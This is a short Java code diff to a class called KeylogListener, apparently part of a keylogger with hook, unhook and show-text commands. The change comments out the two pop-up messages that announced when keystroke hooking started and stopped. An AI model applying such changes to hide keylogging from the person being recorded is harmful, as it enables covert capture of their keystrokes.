@@ -44,7 +44,7 @@ public class KeylogListener implements ActionListener{
 				e2.printStackTrace();
 			}
 				
-			JOptionPane.showMessageDialog(null, "Start Hook");
+			//JOptionPane.showMessageDialog(null, "Start Hook");
 			
 		}
 		else if ("UNHOOK".equals(scr))
@@ -59,7 +59,7 @@ public class KeylogListener implements ActionListener{
 				e2.printStackTrace();
 			}
 				
-			JOptionPane.showMessageDialog(null, "Start UnHook");
+			//JOptionPane.showMessageDialog(null, "Start UnHook");
 		}
 		else if ("SHOW TEXT".equals(scr))
 		{
